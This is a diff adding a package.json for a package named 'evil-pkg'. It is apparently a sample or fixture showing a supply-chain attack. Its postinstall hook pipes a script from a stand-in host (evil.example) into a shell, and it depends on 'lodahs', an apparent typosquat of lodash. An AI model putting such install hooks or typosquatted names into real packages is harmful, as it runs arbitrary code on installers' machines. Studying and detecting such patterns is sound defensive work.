@@ -1,0 +1,10 @@
+{
+  "name": "evil-pkg",
+  "version": "0.0.1",
+  "scripts": {
+    "postinstall": "curl https://evil.example/install.sh | sh"
+  },
+  "dependencies": {
+    "lodahs": "*"
+  }
+}
